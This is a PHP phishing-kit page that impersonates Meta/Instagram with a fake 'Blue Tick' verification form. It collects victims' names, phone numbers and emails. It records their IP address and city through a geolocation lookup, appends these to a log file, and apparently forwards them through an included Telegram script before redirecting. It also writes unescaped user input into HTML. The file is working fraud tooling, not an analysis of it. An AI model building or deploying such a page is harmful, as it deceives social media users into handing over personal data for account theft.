<?php



session_start();
set_time_limit(0);
error_reporting(E_ALL);




$name = $_GET["name"];


if($_POST){

	$name=$_GET["name"];
	$name=$_POST["name"];
	$number=$_POST["number"];
	$mail=$_POST["mail"];
	$objection=$_POST["objection"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

    $file = fopen('igardo-mail.php', 'a');
fwrite($file, "
<html lang='tr' dir='ltr'>
  <head>
      <title>Igardo</title>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <!-- <title>Login Form | CodingLab</title> -->
    <link rel='stylesheet' href='q-igardo-phs.css'>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
  </head>
  <body>
    <div class='container'>
      <div class='wrapper'>
 
        <div class='title'><img src='q-igardo-phs/q-igardo.jpg' style='width:34%;  border-radius:23px; box-shadow: rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 7px 13px -3px, rgba(0, 0, 0, 0.2) 0px -3px 0px inset;'></div>
        <form action='q-wrong-pw/index.php'>

          <div class='row'>
            <i class='fas fa-user'></i>
          <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>İsim ;<br>$name</p>
          </div>
            <div class='row'>
            <i class='fas fa-check'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>Telefon Numarası ;<br>$number</p>
         
          </div>
               <div class='row'>
            <i class='fas fa-check'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>Email ;<br>$mail</p>
         
       
          </div>
             <div class='row'>
            <i class='fas fa-check'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>İp Adresi ;<br>$ip</p>
         
          </div>
            <div class='row'>
            <i class='fas fa-clock'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>Giriş Zamanı ;<br>$cur_time</p>
         
          </div>
                 <div class='row'>
            <i class='fas fa-globe'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:1;'>Ülke ;<br>$ulke</p>
         
          </div>
       
          <div class='row'>
            <i class='fas fa-flag'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Şehir ;<br>$sehir</p>
         
          </div>
   
          <div class='signup-link'>Yapımcı ve Geliştirici <a href='#5'><br>© Igardo Ivanov</a></div>
        </form>
      </div>
    </div>

  </body>
</html>


"); 

fclose($file);
echo '';
  
   header("Location: q-igardo-complete.php");
   include 'igardotelegram/telegrammail.php';
}
?>

<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
<link rel="apple-touch-icon" type="image/png" href="q-igardo-img/q-igardo-favicon.png" />
<meta name="apple-mobile-web-app-title" content="Igardo">

<link rel="shortcut icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" />

<link rel="mask-icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" color="#111" />


  <title>Info</title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
   

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="q-igardo-css/q-igardo-contact.css">
    
  
  
<style>
</style>

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>


</head>

<body translate="no" >
  <form method="post" class="my-form">
  <div class="container">
      <img src="q-igardo-img/q-igardo-logo.png" style="width:60%;">
    <h1 style="font-size:14px;">Hello dear user, we are proud of you for purchasing a Blue Tick. Fill out this form so we can get to know you fully. After completing this information form, you will receive your Blue tick certificate for your account via e-mail within 48 hours. After receiving the mail, the blue tick will be activated for your account.</h1>
    <ul>
      <li>
        <select>
          <option selected disabled>Choose a category for your Account</option>
          <option>News/Media</option>
          <option>Sports</option>
           <option>Government/Politics</option>
          <option>Music</option>
           <option>Fashion</option>
          <option>Entertainment</option>
           <option>Blogger/Influencer</option>
          <option>Business/Brand/Organization</option>
          <option>Other</option>      
        </select>
      </li>
      <li>
        <div class="grid grid-2">
          <input type="text" name="name" placeholder="Name" required>  
          <input type="text" placeholder="Surname" required>
        </div>
      </li>
      <li>
        <div class="grid grid-2">
          <input type="email" placeholder="Email" name="mail" required>  
          <input type="tel" name="number" placeholder="Phone">
        </div>
      </li>    
      <li>
      
      </li>   
      <li>
        <input type="checkbox" id="terms">
        <label for="terms">I have read and agreed with <a href="">the terms and conditions.</a></label>
      </li>  
      <li>
        <div class="grid grid-3">
          <div class="required-msg">REQUIRED FIELDS</div>
          <button class="btn-grid" type="submit" disabled>
            <span class="back">
              <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/162656/email-icon.svg" alt="">
            </span>
            <span class="front">SUBMIT</span>
          </button></form>
          <button class="btn-grid" type="reset" disabled>
            <span class="back">
              <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/162656/eraser-icon.svg" alt="">
            </span>
            <span class="front">RESET</span>
          </button> 
        </div>
      </li>    
    </ul>
  </div>
</form>
<footer>
  <div class="container">
    <small><span></span>From <a href="http://instagram.com/" target="_blank">Meta</a>
    </small>
  </div>
</footer>
     

  
      <script id="rendered-js" >
const checkbox = document.querySelector('.my-form input[type="checkbox"]');
const btns = document.querySelectorAll(".my-form button");

checkbox.addEventListener("change", function () {
  const checked = this.checked;
  for (const btn of btns) {
    checked ? btn.disabled = false : btn.disabled = true;
  }
});
//# sourceURL=pen.js
    </script>

  

</body>


  </div> 
 </body>
</html>
